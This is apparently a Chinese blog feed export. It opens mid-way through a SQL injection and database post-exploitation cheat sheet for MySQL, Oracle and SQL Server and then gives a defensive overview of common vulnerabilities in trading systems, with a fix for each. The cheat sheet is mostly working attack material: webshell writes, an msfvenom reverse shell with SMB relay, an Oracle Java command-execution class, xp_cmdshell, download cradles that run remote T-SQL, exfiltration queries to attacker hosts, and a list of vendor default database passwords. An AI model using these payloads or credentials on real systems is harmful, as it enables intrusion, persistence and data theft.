EXECUTE AS LOGIN = ‘sa’; SELECT @@VERSION; 创建sysadmin用户 * USE [master]GOCREATE LOGIN [test] WITH PASSSWORD=N ‘test’, DEFAULT_DATABASE=[master], CHECK_EXPIRATION=OFF, CHECK_POLICY=OFFGOEXEC master..sp_addsrvrolemember @loginame=N’test’, @rolename=N’sysadmin’GO 创建sysadmin用户 * EXEC sp_addlogin ‘user’, ‘pass’;*EXEC master.dbo.sp_addsrvrolemember ‘user’, ‘sysadmin’; 删除用户 * EXEC sp_droplogin ‘user’; 检索SQL代理连接密码 exec msdb.dbo.sp_get_sqlagent_properties 检索DTS连接密码 select msdb.dbo.rtbldmbprops 获取sysadmin作为本地管理员 https://blog.netspi.com/get-sql-server-sysadmin-privileges-local-admin-powerupsql/ 启动存储过程 https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/ 触发器创建 https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/ Windows自动登录密码 https://blog.netspi.com/get-windows-auto-login-passwords-via-sql-server-powerupsql/ xp_regwrite非sysadmin执行 https://gist.github.com/nullbind/03af8d671621a6e1cef770bace19a49e 具有可信赖数据库的存储过程 https://blog.netspi.com/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases 存储过程用户模拟 https://blog.netspi.com/hacking-sql-server-stored-procedures-part-2-user-impersonation/ 默认密码 sa:sasa:[empty] [username]:[username] 实例的默认密码（实例名称，用户，密码） “ACS”,”ej”,”ej”“ACT7”,”sa”,”sage” “AOM2”,”admin”,”ca_admin” “ARIS”,”ARIS9”,”*ARIS!1dm9n#” “AutodeskVault”,”sa”,”AutodeskVault@26200” “BOSCHSQL”,”sa”,”RPSsql12345” “BPASERVER9”,”sa”,”AutoMateBPA9” “CDRDICOM”,”sa”,”CDRDicom50!” “CODEPAL”,”sa”,”Cod3p@l” “CODEPAL08”,”sa”,”Cod3p@l” “CounterPoint”,”sa”,”CounterPoint8” “CSSQL05”,”ELNAdmin”,”ELNAdmin” “CSSQL05”,”sa”,”CambridgeSoft_SA” “CADSQL”,”CADSQLAdminUser”,”Cr41g1sth3M4n!” “DHLEASYSHIP”,”sa”,”DHLadmin@1” “DPM”,”admin”,”ca_admin” “DVTEL”,”sa”,”” “EASYSHIP”,”sa”,”DHLadmin@1” “ECC”,”sa”,”Webgility2011” “ECOPYDB”,”e+C0py2007_@x”,”e+C0py2007_@x” “ECOPYDB”,”sa”,”ecopy” “Emerson2012”,”sa”,”42Emerson42Eme” “HDPS”,”sa”,”sa” “HPDSS”,”sa”,”Hpdsdb000001” “HPDSS”,”sa”,”hpdss” “INSERTGT”,”msi”,”keyboa5” “INSERTGT”,”sa”,”” “INTRAVET”,”sa”,”Webster#1” “MYMOVIES”,”sa”,”t9AranuHA7” “PCAMERICA”,”sa”,”pcAmer1ca” “PCAMERICA”,”sa”,”PCAmerica” “PRISM”,”sa”,”SecurityMaster08” “RMSQLDATA”,”Super”,”Orange” “RTCLOCAL”,”sa”,”mypassword” “SALESLOGIX”,”sa”,”SLXMaster” “SIDEXIS_SQL”,”sa”,”2BeChanged” “SQL2K5”,”ovsd”,”ovsd” “SQLEXPRESS”,”admin”,”ca_admin” “STANDARDDEV2014”,”test”,”test” “TEW_SQLEXPRESS”,”tew”,”tew” “vocollect”,”vocollect”,”vocollect” “VSDOTNET”,”sa”,”” “VSQL”,”sa”,”111” 命令执行 执行系统命令是SQL注入的主要目标之一，这有助于完全控制主机操作系统。这可能通过直接执行命令，修改现有数据以在网页上放置shell或者利用数据库中的隐藏功能来实现。 MySQL 描述 语句 命令执行（PHP） SELECT “&lt;? echo passthru($_GET[‘cmd’]); ?&gt;” INTO OUTFILE ‘/var/www/shell.php’ 使用MySQL CLI Access执行命令 https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/ SMB中继外壳 Requires Metasploit smbrelayx 生成反向shell有效负载1msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR.IP.GOES.HERE LPORT=443 -f exe &gt; reverse_shell.exe 生成一个侦听器来传递反向shell1smbrelayx.py -h VICTIM.IP.GOES.HERE -e ./reverse_shell.exe 执行下面的任何一个MySQL查询来调用监听器12345select load_file('\\\\YOUR.IP.GOES.HERE\\aa');select load_file(0x5c5c5c5c3139322e3136382e302e3130315c5c6161);select 'netspi' into dumpfile '\\\\YOUR.IP.GOES.HERE\\aa';select 'netspi' into outfile '\\\\YOUR.IP.GOES.HERE\\aa';load data infile '\\\\YOUR.IP.GOES.HERE\\aa' into table database.table_name; 有关更多信息，请参见此处 Oracle 如果安装了Java，可用于执行命令 描述 语句 创建Java类 /* create Java class */ BEGIN EXECUTE IMMEDIATE &#39;create or replace and compile java source named &quot;PwnUtil&quot; as import java.io.*; public class PwnUtil{ public static String runCmd(String args){ try{ BufferedReader myReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream()));String stemp, str = &quot;&quot;;while ((stemp = myReader.readLine()) != null) str += stemp + &quot;\n&quot;;myReader.close();return str;} catch (Exception e){ return e.toString();}} public static String readFile(String filename){ try{ BufferedReader myReader = new BufferedReader(new FileReader(filename));String stemp, str = &quot;&quot;;while((stemp = myReader.readLine()) != null) str += stemp + &quot;\n&quot;;myReader.close();return str;} catch (Exception e){ return e.toString();}}};&#39;; END; / BEGIN EXECUTE IMMEDIATE &#39;create or replace function PwnUtilFunc(p_cmd in varchar2) return varchar2 as language java name &#39;&#39;PwnUtil.runCmd(java.lang.String) return String&#39;&#39;;&#39;; END; / /* run OS command */ SELECT PwnUtilFunc(&#39;ping -c 4 localhost&#39;) FROM dual; 创建Java类（十六进制编码） /* create Java class */SELECT TO_CHAR(dbms_xmlquery.getxml(‘declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate utl_raw.cast_to_varchar2(hextoraw(‘’637265617465206f72207265706c61636520616e6420636f6d70696c65206a61766120736f75726365206e616d6564202270776e7574696c2220617320696d706f7274206a6176612e696f2e2a3b7075626c696320636c6173732070776e7574696c7b7075626c69632073746174696320537472696e672072756e28537472696e672061726773297b7472797b4275666665726564526561646572206d726561643d6e6577204275666665726564526561646572286e657720496e70757453747265616d5265616465722852756e74696d652e67657452756e74696d6528292e657865632861726773292e676574496e70757453747265616d282929293b20537472696e67207374656d702c207374723d22223b207768696c6528287374656d703d6d726561642e726561644c696e6528292920213d6e756c6c29207374722b3d7374656d702b225c6e223b206d726561642e636c6f736528293b2072657475726e207374723b7d636174636828457863657074696f6e2065297b72657475726e20652e746f537472696e6728293b7d7d7d’’)); SEXECUTE IMMEDIATE utl_raw.cast_to_varchar2(hextoraw(‘’637265617465206f72207265706c6163652066756e6374696f6e2050776e5574696c46756e6328705f636d6420696e207661726368617232292072657475726e207661726368617232206173206c616e6775616765206a617661206e616d65202770776e7574696c2e72756e286a6176612e6c616e672e537472696e67292072657475726e20537472696e67273b’’)); end;’)) results FROM dual /* run OS command */SELECT PwnUtilFunc(‘ping -c 4 localhost’) FROM dual; SQL Server 名称 语句 xp_cmdshell -- Enable show advanced options sp_configure ‘show advanced options’, 1 RECONFIGURE GO -- Enable xp_cmdshell sp_configure ‘xp_cmdshell’, 1 RECONFIGURE GO EXEC xp_cmdshell ‘net user’ 写入注册表自动运行 https://blog.netspi.com/establishing-registry-persistence-via-sql-server-powerupsql/ https://gist.github.com/nullbind/03af8d671621a6e1cef770bace19a49e 写入文件自动运行 https://blog.netspi.com/how-to-hack-database-links-in-sql-server/ Agent Job https://www.optiv.com/blog/mssql-agent-jobs-for-command-execution 存储过程中的SQL注入 https://blog.netspi.com/hacking-sql-server-stored-procedures-part-3-sqli-and-user-impersonation/ CLR组件 https://blog.netspi.com/attacking-sql-server-clr-assemblies/ 自定义扩展存储过程 https://github.com/NetSPI/PowerUpSQL/blob/master/templates/cmd_exec.cpp TSQL 名称 语句 ActiveX Javascript Agent Job https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_activex_jscript.sql ActiveX VBScript Agent Job https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_activex_vbscript.sql cmdexec Agent Job https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_cmdexec.sql Powershell Agent Job https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_powershell.sql 自定义命令行shell https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_customxp.cpp OLE自动化对象 https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_oleautomationobject.sql OPENROWSET https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_openrowset.sql Python https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_pythonscript.tsql R https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_rscript.sql xp_cmdshell proxy https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_xpcmdshell_proxy.sql 文件读写 读取和写入文件有助于数据收集和数据泄露。许多方法包括写入webroot，这可以执行webshell，或允许数据通过端口80/443被泄露。 MySQL *需要特权用户 描述 语句 转储到文件 SELECT * FROM mytable INTO dumpfile ‘/tmp/somefile’ 写入 PHP Shell 到文件 SELECT ‘system($_GET[\’c\’]); ?&gt;’ INTO OUTFILE ‘/var/www/shell.php’ 读文件 SELECT LOAD_FILE(‘/etc/passwd’) 读取混淆的文件 SELECT LOAD_FILE(0x633A5C626F6F742E696E69)reads c:\boot.ini 文件权限 SELECT file_priv FROM mysql.user WHERE user = ‘netspi’SELECT grantee, is_grantable FROM information_schema.user_privileges WHERE privilege_type = ‘file’ AND grantee like ‘%netspi%’ Oracle 有时可以使用UTL_FILE。检查以下是否为非null 1SELECT value FROM v$parameter2 WHERE name = 'utl_file_dir'; 如果安装了Java（Oracle Express中不可用），可用于读取和写入文件。 SQL Server *需要特权用户 描述 语句 在服务器中下载Cradle bulk - TSQL -- Bulk Insert - Download Cradle Example-- Setup variables Declare @cmd varchar(8000)-- Create temp tableCREATE TABLE #file (content nvarchar(4000));-- Read file into temp table - web server must support propfindBULK INSERT #file FROM ‘\sharepoint.acme.com@SSL\Path\to\file.txt’;-- Select contents of fileSELECT @cmd = content FROM #file-- Display commandSELECT @cmd-- Run commandEXECUTE(@cmd)-- Drop the temp tableDROP TABLE #file 下载Cradle OAP 1 - SQL -- OLE Automation Procedure - Download Cradle Example-- Does not require a table, but can’t handle larger payloads-- Note: This also works with unc paths \\ip\file.txt-- Note: This also works with webdav paths \ip@80\file.txt However, the target web server needs to support propfind.-- Setup VariablesDECLARE @url varchar(300)DECLARE @WinHTTP intDECLARE @handle intDECLARE @Command varchar(8000-- Set target url containting TSQLSET @url = ‘http://127.0.0.1/mycmd.txt&#39;-- Setup namespaceEXEC @handle=sp_OACreate ‘WinHttp.WinHttpRequest.5.1’,@WinHTTP OUT-- Call the Open method to setup the HTTP requestEXEC @handle=sp_OAMethod @WinHTTP, ‘Open’,NULL,’GET’,@url,’false’-- Call the Send method to send the HTTP GET requestEXEC @handle=sp_OAMethod @WinHTTP,’Send’-- Capture the HTTP response contentEXEC @handle=sp_OAGetProperty @WinHTTP,’ResponseText’, @Command out-- Destroy the objectEXEC @handle=sp_OADestroy @WinHTTP-- Display commandSELECT @Command-- Run commandEXECUTE (@Command) 下载Cradle OAP 2 - TSQL -- OLE Automation Procedure - Download Cradle Example - Option 2-- Can handle larger payloads, but requires a table-- Note: This also works with unc paths \ip\file.txt-- Note: This also works with webdav paths \ip@80\file.txt However, the target web server needs to support propfind.-- Setup VariablesDECLARE @url varchar(300)DECLARE @WinHTTP intDECLARE @Handle intDECLARE @Command varchar(8000)-- Set target url containting TSQLSET @url = ‘http://127.0.0.1/mycmd.txt&#39;-- Create temp table to store downloaded stringCREATE TABLE #text(html text NULL)-- Setup namespaceEXEC @Handle=sp_OACreate ‘WinHttp.WinHttpRequest.5.1’,@WinHTTP OUT-- Call open method to configure HTTP requestEXEC @Handle=sp_OAMethod @WinHTTP, ‘Open’,NULL,’GET’,@url,’false’-- Call Send method to send the HTTP requestEXEC @Handle=sp_OAMethod @WinHTTP,’Send’-- Capture the HTTP response contentINSERT #text(html)EXEC @Handle=sp_OAGetProperty @WinHTTP,’ResponseText’-- Destroy the objectEXEC @Handle=sp_OADestroy @WinHTTP-- Display the commadSELECT @Command = html from #textSELECT @Command-- Run the commandEXECUTE (@Command)-- Remove temp tableDROP TABLE #text 读取文件 - TSQL https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenDataSourceTxt.sql https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_BulkInsert.sql https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenDataSourceXlsxhttps://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenRowSetBulk.sqlhttps://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenRowSetTxt.sql https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/readfile_OpenRowSetXlsx.sql 写文件 - TSQL https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/writefile_bulkinsert.sqlhttps://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/writefile_OpenRowSetTxt.sql 横向移动 横向移动允许测试人员访问不同的功能/数据集，这些功能/数据不明确要求为特权的用户。横向切换用户帐户将暴露不同的信息，并可能有助于损害更多特权用户。 MySQL *需要特权用户 描述 语句 创建用户 CREATE USER ‘netspi‘@’%’ IDENTIFIED BY ‘password’ 删除用户 DROP USER netspi Oracle 描述 语句 创建用户 CREATE USER user IDENTIFIED by pass; 删除用户 DROP USER user SQL Server *需要特权用户 描述 语句 创建用户 EXEC sp_addlogin ‘user’, ‘pass’; 删除用户 EXEC sp_droplogin ‘user’; 链接抓取 https://blog.netspi.com/sql-server-link-crawling-powerupsql/ 作为当前服务连接到远程数据库 –Requires sysadmin SELECT * FROM OPENDATASOURCE(‘SQLNCLI’, ‘Server=MSSQLSRV04\SQLSERVER2016;Trusted_Connection=yes;’).master.dbo.sysdatabases 数据泄露 泄漏的数据以及任何受损数据的脱机副本可以用来做数据分析。数据可以通过文件，各种Layer 4请求和隐藏技术被泄漏。 *需要特权用户 MySQL 描述 语句 DNS 请求 SELECT LOAD\_FILE(concat(&#39;\\\\&#39;,(QUERY\_WITH\_ONLY\_ONE\_ROW), &#39;yourhost.com\\&#39;)) SMB 分享 SELECT * FROM USERS INTO OUTFILE &#39;\\attacker\SMBshare\output.txt&#39; HTTP 服务器 SELECT * FROM USERS INTO OUTFILE &#39;/var/www/html/output.txt&#39; 数字连接 SELECT length(user())SELECT ASCII(substr(user(),1))当数据只能作为数字导出时，转换为ASCII。 有关自动化点击此处连接. Oracle 描述 语句 将多行合并为一行 SELECT dbms_xmlgen.getxmltype(&#39;select user from dual&#39;) FROM dual XML外部实体 SELECT xmltype(&#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://IP/test&quot;&gt; %remote; %param1;]&gt;&#39;) FROM dual; URL_HTTP 请求 (Pre-11gR2) SELECT UTL_HTTP.request (&#39;http://IP/test&#39;) FROM dual; 避免特殊字符 SELECT UTL_URL.escape(&#39;http://IP/&#39; &#124;&#124; USER) FROM dual; SQL Server注意：可以从MSSQL发出DNS请求。但是，此请求需要管理员权限和SQL Server 2005。 描述 语句 制造DNS请求 DECLARE @host varchar(800); select @host = name + &#39;-&#39; + master.sys.fn_varbintohexstr(password_hash) + &#39;netspi.com&#39; from sys.sql_logins;exec(&#39;xp_fileexist &quot;\&#39; + @host + &#39;c$boot.ini&quot;&#39;); UNC路径（DNS请求） xp_dirtree ‘\\data.domain.com\file’ 启用sp_send_dbmail并发送查询 sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;sp_configure &#39;Database Mail XPs&#39;, 1;RECONFIGURE;exec msdb..sp_send_dbmail @recipients=&#39;harold@netspi.com&#39;,@query=&#39;select @@version&#39;; 基本的xp_sendmail查询 EXEC master..xp_sendmail &#39;harold@netspi.com&#39;, &#39;This is a test.&#39; 使用xp_sendmail发送完整的电子邮件 EXEC xp_sendmail @recipients=&#39;harold@netspi.com&#39;, @message=&#39;This is a test.&#39;, @copy_recipients=&#39;test@netspi.com&#39;, @subject=&#39;TEST&#39; 通过xp_sendmail发送查询结果 EXEC xp_sendmail &#39;harold@netspi.com&#39;, @query=&#39;SELECT @@version&#39;; 通过xp_sendmail发送查询结果作为附件 CREATE TABLE ##texttab (c1 text) INSERT ##texttab values (&#39;Put messge here.&#39;) DECLARE @cmd varchar(56)SET @cmd = &#39;SELECT c1 from ##texttab&#39;EXEC master.dbo.xp_sendmail &#39;robertk&#39;,@query = @cmd, @no_header=&#39;TRUE&#39;DROP TABLE ##texttab 持久化 在系统上获得持久性可在网络中创建半永久性的立足点，从而延长利用时间。有了这个额外的时间，可以尝试不同的载体和利用方法。 *需要特权用户 MySQL 暂无 Oracle 暂无 SQL Server 描述 语句 启动存储过程 https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/ 触发器 https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/ Regwrite https://blog.netspi.com/establishing-registry-persistence-via-sql-server-powerupsql/ 6.其他贡献者Aaron Yaeger Antti Rantasaari Ben Tindell Colin Salisbury Eric Gruber (@egru) Jake Reynolds (@jreynoldsdev) Khai Tran (@k_tr4n) Rafael Seferyan Scott Sutherland (@_nullbind) 参考MySQLhttp://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet http://www.sqlinjectionwiki.com/categories/2/mysql-sql-injection-cheat-sheet/ https://www.tutorialspoint.com/mysql/mysql-sql-injection.htm https://dev.mysql.com/doc/refman/5.7/en/bit-functions.html http://garage4hackers.com/showthread.php?t=1990 https://www.perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/ https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/#UnionInjections https://websec.ca/kb/sql_injection http://hakipedia.com/index.php/SQL_Injection http://blog.kotowicz.net/2013/01/abusing-mysql-string-arithmetic-for.html https://media.blackhat.com/us-13/US-13-Salgado-SQLi-Optimization-and-Obfuscation-Techniques-WP.pdf http://www.securiteam.com/securityreviews/5JP0F20EUM.html https://osandamalith.com/2017/02/03/mysql-out-of-band-hacking/ http://zombiehelp54.blogspot.ro/2017/02/sql-injection-in-update-query-bug.html?m=1 http://stackoverflow.com/questions/14714750/how-to-get-true-size-of-mysql-database http://stackoverflow.com/questions/5648420/get-all-columns-from-all-mysql-tables http://www.regular-expressions.info/creditcard.html Oraclehttp://www.0xdeadbeef.info/exploits/raptor_oraexec.sql http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet http://www.sqlinjectionwiki.com/Categories/3/oracle-sql-injection-cheat-sheet https://information.rapid7.com/rs/rapid7/images/R7%20SQL_Injection_Cheat_Sheet.v1.pdf http://www.sqlinjection.net/union/ SQL Serverhttps://information.rapid7.com/rs/rapid7/images/R7%20SQL_Injection_Cheat_Sheet.v1.pdf https://www.gracefulsecurity.com/sql-injection-exploitation/ http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet http://websec.ca/kb/sql_injection#MSSQL_Default_Databases https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/ http://pentestmonkey.net/blog/mssql-dns http://www.sqlinjectionwiki.com/Categories/1/mssql-sql-injection-cheat-sheet/ https://github.com/nullbind/Powershellery/blob/master/Stable-ish/MSSQL/templates-tsql/Get-QueryHistory.sql https://www.codeproject.com/Questions/219741/Select-nth-row-of-a-table-in-sql-server http://www.sqlinjection.net/time-based/ https://stackoverflow.com/questions/639854/check-if-a-row-exists-otherwise-insert 沙箱 可以在下面找到一些有用的用于测试查询的在线沙箱 MySQLhttp://sqlfiddle.com/#!9 http://rextester.com/l/mysql_online_compiler https://www.tutorialspoint.com/mysql_terminal_online.php https://www.jdoodle.com/online-mysql-terminal Oraclehttp://sqlfiddle.com/#!4 https://livesql.oracle.com/apex/livesql/file/index.html https://www.tutorialspoint.com/oracle_terminal_online.php SQL Serverhttp://sqlfiddle.com/#!6 https://turbo.net/sql https://sqlzoo.net/ http://www.headfirstlabs.com/sql_hands_on/ 工具 可以在下面找到一些有用的用于识别和自动执行SQL注入的工具： MySQLhttp://sqlmap.org/ http://sqlninja.sourceforge.net/ https://metasploit.com/ Oraclehttp://sqlmap.org/ http://sqlninja.sourceforge.net/ https://metasploit.com/ SQL Serverhttp://sqlmap.org/ http://sqlninja.sourceforge.net/ https://metasploit.com/]]></content>
      <categories>
        <category>Bug</category>
      </categories>
      <tags>
        <tag>漏洞</tag>
        <tag>wiki</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[交易系统常见问题及方案概述]]></title>
    <url>%2FSecurity%2F%E4%BA%A4%E6%98%93%E7%B3%BB%E7%BB%9F%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E5%8F%8A%E6%96%B9%E6%A1%88%E6%A6%82%E8%BF%B0%2F</url>
    <content type="text"><![CDATA[一、安全概述 信息安全可以建立、采取有效的技术和管理手段，保护计算机信息系统和网络内的计算机硬件、软件、数据及应用等不因偶然或恶意的原因而遭到破坏、更改和泄漏，保障信息系统能够连续、正常运行。但信息安全是永远是相对的，并且需要不断持续关注和改进，永远没有一劳永逸的安全防护措施。 二、常见问题1.用户注册a.明文传输 在传输用户注册信息时未对信息进行加密处理，攻击者能够使用中间人攻击截获未加密的用户注册信息。 建议：对用户注册信息加密后传输。 b.暴力破解 在输入手机验证码等动态验证码时未进行人机校验，攻击者可利用工具对验证码进行暴力破解。 建议：增加图形验证码。 c.验证码回传 用户获取动态验证码时后端会将验证码通过response数据包返回到前端，攻击者能够通过抓包获取验证码从而实现任意手机号注册。 建议：过滤response包中验证码字段。 d.前端验证 在后端验证完相关信息后会像前端返回状态码，前端根据状态码控制跳转，攻击者通过修改返回的状态码实现绕过验证。 建议：通过后端控制页面跳转。 e.验证码失效机制验证码失效分两种情况： 1.验证码可以重复使用，攻击者可以通过手动输入一次验证码进行爆破。 建议：验证码使用后自动刷新。 2.用户A获取的验证码可以用于用户B注册，攻击者可以实现任意用户注册。 建议：验证码关联用户。 f.Sql注入 由于查询用户是否存在时未对用户输入进行过滤或过滤不完全，攻击者可通过构造sql语句获取数据库信息。 建议：过滤用户输入；采用参数化查询；过滤数据库返回错误信息。 g.XSS 由于在用户注册时未对用户输入进行过滤或者过滤不完全，攻击者可以通过构造语句实现XSS。 建议：过滤用户输入；转义后输出。 h.账号遍历 在注册用户时提示用户已存在，攻击者可以通过批量发送数据包来获取已注册的用户账号。 建议：限制单ip一定时间内提交数据次数；用户存在与否统一不作提示。 i.业务流绕过 在某些情况下注册流程分为几个页面，攻击者可以通过直接访问后续流程页面实现绕过验证注册。 建议：严格控制业务流顺序。 j.短信、邮件炸弹 调用短信、邮件接口时未进行限制，攻击者可以通过批量发送请求数据包实现短信、邮件轰炸或使短信邮件接口堵塞，影响业务正常运行。 建议：在调用短信、邮件接口时校验验证码；限制单ip一定时间内请求次数。 2.用户登陆a.明文传输 在传输用户登陆信息时未对信息进行加密处理，攻击者能够使用中间人攻击截获未加密的用户注册信息。 建议：对用户登陆信息加密后传输。 b.暴力破解 在输入手机验证码等动态验证码时未进行人机校验，攻击者可利用工具对验证码进行暴力破解。 建议：增加图形验证码。 c.万能密码 由于判断用户凭证时判断语句存在逻辑缺陷（如：sql=\&quot;select \* from admin where username=\&quot;&amp;user&amp;\&quot; and password=\&quot;&amp;pwd&amp;\&quot;\&quot;），攻击者可以构造语句使密码验证失效，实现万能密码。 建议：过滤用户输入；查询和判断分步执行。 d.Sql注入 由于查询用户是否存在时未对用户输入进行过滤或过滤不完全，攻击者可通过构造sql语句获取数据库信息。 建议：过滤用户输入；采用参数化查询；过滤数据库返回错误信息。 e.前端验证 在后端验证完相关信息后会像前端返回状态码，前端根据状态码控制跳转，攻击者通过修改返回的状态码实现绕过验证。 建议：通过后端控制页面跳转 f.登陆提示信息 在用户输入凭证时会根据账号密码的正确性做出相应的提示，攻击者能够据此来判断猜测的用户凭证是否正确。 建议：对于登陆提示统一为用户名或密码错误。 3.密码找回a.明文传输 在传输用户信息时未对信息进行加密处理，攻击者能够使用中间人攻击截获未加密的用户注册信息。 建议：对用户信息加密后传输。 b.暴力破解 在输入手机验证码等动态验证码时未进行人机校验，攻击者可利用工具对验证码进行暴力破解。 建议：增加图形验证码。 c.前端验证 在后端验证完相关信息后会像前端返回状态码，前端根据状态码控制跳转，攻击者通过修改返回的状态码实现绕过验证。 建议：通过后端控制页面跳转 d.验证码回传 用户获取动态验证码时后端会将验证码通过response数据包返回到前端，攻击者能够通过抓包获取验证码从而实现任意手机号注册。 建议：过滤response包中验证码字段。 e.验证码失效机制验证码失效分两种情况： 1.验证码可以重复使用，攻击者可以通过手动输入一次验证码进行爆破。 建议：验证码使用后自动刷新。 2.用户A获取的验证码可以用于用户B修改密码，攻击者可以实现任意用户修改密码。 建议：验证码关联用户。 f.业务流绕过 在某些情况下密码找回流程分为几个页面，攻击者可以通过直接访问后续流程页面实现绕过验证注册。 建议：严格控制业务流顺序。 g.账号遍历 在找回密码时提示用户不存在，攻击者可以通过批量发送数据包来获取已注册的用户账号。 建议：限制单ip一定时间内提交数据次数；用户存在与否统一不作提示。 h.短信、邮件炸弹 调用短信、邮件接口时未进行限制，攻击者可以通过批量发送请求数据包实现短信、邮件轰炸或使短信邮件接口堵塞，影响业务正常运行。 建议：在调用短信、邮件接口时校验验证码；限制单ip一定时间内请求次数。 4.用户信息a.越权 在调用操作接口（查询、修改、删除等）时未校验用户身份，攻击者能够根据id等关键字实现越权操作接口。 建议：调用接口时校验用户身份。 b.Sql注入 由于查询用户信息时未对用户输入进行过滤或过滤不完全，攻击者可通过构造sql语句获取数据库信息。 建议：过滤用户输入；采用参数化查询；过滤数据库返回错误信息。 c.XSS 由于在保存用户信息时未对用户输入进行过滤或者过滤不完全，攻击者可以通过构造语句实现XSS。 建议：过滤用户输入；转义后输出。 d.文件上传 在文件上传点未对上传文件做限制或仅在前端对文件做限制，攻击者能够上传脚本等文件获得操作权限。 建议：后端验证文件类型；重写文件；不返回保存路径；保存文件在没有执行权限的目录下。 5.订单信息a.订单信息遍历 在调用订单信息查询接口时未校验用户身份，攻击者能够根据id等关键字实现越权操作接口。 建议：调用接口时校验用户身份。 b.Sql注入 由于查询订单信息时未对用户输入进行过滤或过滤不完全，攻击者可通过构造sql语句获取数据库信息。 建议：过滤用户输入；采用参数化查询；过滤数据库返回错误信息。 6.用户充值a.充值金额修改 在用户充值时，仅根据三方接口返回的充值状态判断充值是否成功，攻击者通过修改支付金额实现小金额充值。 建议：充值时校验三方接口返回的充值状态以及充值金额等信息。 7.用户交易a.支付金额修改 1.用户支付时仅根据支付状态来判断订单是否支付成功，攻击者通过修改支付金额实现小金额支付。 建议：交易时校验支付接口返回的充值状态以及充值金额等信息。 2.用户支付时系统根据用户客户端当前时间确定汇率，攻击者通过修改本机时间达到低价支付。 建议：支付时根据最新汇率确定支付金额。 b.竞争机制 在极短时间内提交两笔支付请求，两笔交易会同时访问共享内存，由于竞争条件的存在请求会按照线程运行的时序运行，这时就可能存在竞争条件漏洞如下图。 建议：使用乐观锁或者悲观锁来保证事务的ACID特性，避免一个事务读取另一个事务未提交的数据。 8.用户提现a.竞争机制 在极短时间内提交两笔提现请求，两笔交易会同时访问共享内存，由于竞争条件的存在请求会按照线程运行的时序运行，这时就可能存在竞争条件漏洞如下图。 建议：使用乐观锁或者悲观锁来保证事务的ACID特性，避免一个事务读取另一个事务未提交的数据。 9.管理后台a.管理页面暴露 由于管理后台路径过于常规化，攻击者能够通过字典爆破后台。 建议：设置复杂管理后台路径（例如：http://192.168.3.249:81/live-not-to-eat-but-eat-to-live/sign-in）。 b.弱口令 管理员用户设置了过于简单的密码，攻击者通过字典爆破获得密码。 建议：设置安全口令 c.Sql注入 由于查询用户是否存在时未对用户输入进行过滤或过滤不完全，攻击者可通过构造sql语句获取数据库信息。 建议：过滤用户输入；采用参数化查询；过滤数据库返回错误信息。 d.万能密码 由于判断用户凭证时判断语句存在逻辑缺陷（如：sql=\&quot;select \* from admin where username=\&quot;&amp;user&amp;\&quot; and password=\&quot;&amp;pwd&amp;\&quot;\&quot;），攻击者可以构造语句使密码验证失效，实现万能密码。 建议：过滤用户输入；查询和判断分步执行。 e.越权 管理页面仅通过登陆页面做身份认证，后续页面没有校验用户身份，攻击者通过直接访问功能路径获得管理员权限。 建议：页面跳转时校验用户身份。 10.用户凭证a.会话失效机制 用户会话注销后未失效，攻击者通过XSS等手段获取用户权限。 建议：用户注销后会话强制失效 11.主机安全a.服务器信息泄露 服务器处理请求时产生错误信息，这些信息未经过滤直接现实在页面上，攻击者据此了解服务器的相关信息。 建议：服务器端产生的信息过滤后展示到前端。 b.目录遍历 服务器访问控制未配置或配置不完全，攻击者能够通过访问根目录，发送一系列”../“字符来遍历高层目录。 建议：对文件目录做访问控制。 c.弱口令 管理员用户设置了过于简单的密码，攻击者通过字典爆破获得密码。 建议：设置安全口令。 d.远程代码执行 某些应用框架没有针对代码中可执行的特殊函数入口做过滤，导致客户端可以提交恶意构造语句提交，并交由服务器端执行。 建议：升级框架版本。 e.java反序列化 Java应用对用户输入，即不可信数据做了反序列化处理，攻击者可以通过构造恶意输入实现任意代码执行。 建议：升级java应用版本。 f.明文存储用户数据 用户数据以明文形式保存在数据库中，当数据库数据泄露时，攻击者能够直接利用这些数据。 